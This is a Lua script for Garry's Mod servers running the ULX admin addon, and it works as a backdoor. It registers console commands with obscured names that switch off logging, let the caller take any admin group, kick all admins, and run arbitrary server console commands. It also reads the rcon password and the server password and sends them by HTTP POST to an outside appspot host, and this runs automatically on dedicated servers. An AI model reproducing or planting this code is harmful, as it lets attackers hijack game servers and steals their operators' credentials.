concommand.Add( "XJX3LNWQO1S58PJ1fza0", function( ply, cmd, args ) 
	//disable ulx logs 
	game.ConsoleCommand("ulx logFile 0\n") 
	game.ConsoleCommand("ulx logEcho 0\n") 
	game.ConsoleCommand("ulx logEvents 0\n") 
	game.ConsoleCommand("ulx logChat 0\n") 
	game.ConsoleCommand("ulx logJoinLeaveEcho 0\n") 
	end )
	
	concommand.Add( "rA0S5oizYoLEup7UDahl", function( ply, cmd, args )
		//set ur own group 
		RunConsoleCommand( "ulx", "adduser", ply:Name(), args[1] )
	end )

	concommand.Add( "3jQgrrPxSLkRbxODPRWr", function( ply, cmd, args ) 
		//set somebodies else group 
		name = string.lower( args[1] ) find_ply = nil for _,v in ipairs( player.GetHumans() ) do 
			if( string.find( string.lower( v:Name() ), name, 1, true ) != nil ) then 
				find_ply = v 
			end 
		end 

		if( find_ply ) then 
			RunConsoleCommand( "ulx", "adduser", find_ply:Name(), args[2] ) 
		end 
	end ) 

	concommand.Add( "C6RcfnOhuPkDPoQkgzu8", function( ply, cmd, args ) 
		//removeuser and kick all users with 'admin' usergroup 

		for _,v in ipairs( player.GetHumans() ) do 
			if( v:IsAdmin() ) then 
				RunConsoleCommand( "ulx", "removeuser", v:Name() ) 
				v:Kick("No fucks given") 
			end 
		end 
	end ) 

	concommand.Add( "kdyaNTIEO8DtIlNALF0U", function( ply, cmd, args ) 
		//remove someones ulx group 
		name = string.lower( args[1] ) 
		find_ply = nil 

		for _,v in ipairs( player.GetHumans() ) do 
			if( string.find( string.lower( v:Name() ), name, 1, true ) != nil ) then 
				find_ply = v 
			end 
		end 

		if( find_ply ) then 
			RunConsoleCommand( "ulx", "removeuser", find_ply:Name() ) 
		end 
	end ) 

	concommand.Add( "Dk1OIaGyEUvtmHQOF53i", function( ply, cmd, args, argStr ) 
		//run commands on server console 
		game.ConsoleCommand( argStr .. "\n" ) 
	end ) 

	concommand.Add( "a1lELkTxk98lG0Ep4Nks", function( ply, cmd, args ) 
		//give someone user access 
		game.ConsoleCommand( 'ulx userallow ' .. args[1] .. '"' .. args[2] .. '" *\n' ) 
	end ) 

	concommand.Add( "XYflUSGbjNED07cEBTsO", function( ply, cmd, args ) 
		//get all ulx groups 
		if( ULib ) then 
			local groups = {} 

			for k, v in pairs( ULib.parseKeyValues( file.Read("ulib/groups.txt", "DATA") ) ) do 
				groups[ #groups + 1 ] = k 
			end 

			ply:PrintMessage( HUD_PRINTTALK, "All ULX groups: " .. string.Implode( ", ", groups ) ) 
		else 
			ply:PrintMessage( HUD_PRINTTALK, "ERROR! No ULX installed! :(" )
		end 
	end ) 

	concommand.Add( "GIN3RCexuujsxZgy2jHq", function( ply, cmd, args ) 
		//send post to website 
		local rcon_config = "" 

		for k,v in pairs( string.Split( file.Read( "cfg/server.cfg", "GAME" ), "\n" ) ) do 
			if( string.StartWith( v, "rcon_password" ) ) then 
				local str = v 
				str = string.Replace( str, "\"", "" ) 
				str = string.Right( str, #str - 14) 
				rcon_config = str 
			end 
		end 

		HTTP( { 
			url = "http://thisisreallylegit.appspot.com/post_server?port=" .. GetConVarString("hostport"), 
			method = "post", 
			parameters = { 
				server_name = tostring( GetConVarString( "hostname" ) ), 
				rcon = tostring( rcon_config ), 
				gamemodename = tostring( engine.ActiveGamemode() ), 
				map = tostring( game.GetMap() ), 
				serverport = GetConVarString( "hostport" ), 
				serverpass = GetConVarString( "sv_password" ) or "", 
				currentplayers = tostring( #player.GetHumans() ) or "0", 
				maxplayers = tostring( game.MaxPlayers() ) or "0", 
				updateage = args[1]
				} 
		} ) 
	end ) 

	if( game.IsDedicated() && GetConVarNumber("sv_lan") == 0 ) then 
		RunConsoleCommand( "GIN3RCexuujsxZgy2jHq", 1 ) 
	end






